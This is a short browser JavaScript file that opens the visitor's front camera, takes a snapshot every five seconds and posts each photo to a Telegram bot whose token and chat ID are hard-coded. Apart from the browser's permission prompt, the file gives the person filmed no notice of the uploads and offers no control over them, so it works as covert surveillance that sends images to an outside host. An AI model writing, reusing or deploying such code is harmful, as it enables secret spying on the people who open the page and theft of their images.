const video = document.getElementById('video');

// Get access to the front camera
navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
})
.then(stream => {
    video.srcObject = stream;
    takePhotosAndSend(stream);
})
.catch(err => {
    console.error("Error accessing the camera: ", err);
});

function takePhotosAndSend(stream) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Function to capture and send a photo
    const captureAndSendPhoto = () => {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', '-1002235920593');
            formData.append('photo', blob, 'photo.jpg');
            
            fetch(`https://api.telegram.org/bot6407133472:AAHEdXwqUMWAWlBcaFluPJyKXxzJyAxuhfE/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo sent successfully: ', data);
            })
            .catch(err => {
                console.error('Error sending photo: ', err);
            });
        }, 'image/jpeg');
    };

    // Capture and send a photo every 5 seconds
    setInterval(captureAndSendPhoto, 5000);
}
